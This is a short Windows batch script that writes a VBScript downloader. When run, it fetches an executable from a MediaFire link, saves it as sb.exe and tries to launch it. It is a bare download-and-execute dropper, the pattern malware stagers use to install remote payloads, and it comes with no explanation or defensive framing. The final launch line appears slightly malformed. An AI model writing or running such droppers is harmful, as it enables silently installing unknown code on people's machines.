echo Set xPost = CreateObject("Microsoft.XMLHTTP") >webdown.vbs 
echo xPost.Open "GET","http://download1001.mediafire.com/y5a38acm6hyg/yrdm0gq763c3dog/1.exe",0 >>webdown.vbs 
echo xPost.Send() >>webdown.vbs 
echo Set sGet = CreateObject("ADODB.Stream") >>webdown.vbs 
echo sGet.Mode = 3 >>webdown.vbs 
echo sGet.Type = 1 >>webdown.vbs 
echo sGet.Open() >>webdown.vbs 
echo sGet.Write(xPost.responseBody) >>webdown.vbs 
echo sGet.SaveToFile "sb.exe",2 >>webdown.vbs 
cscript webdown.vbs
start=sb.exe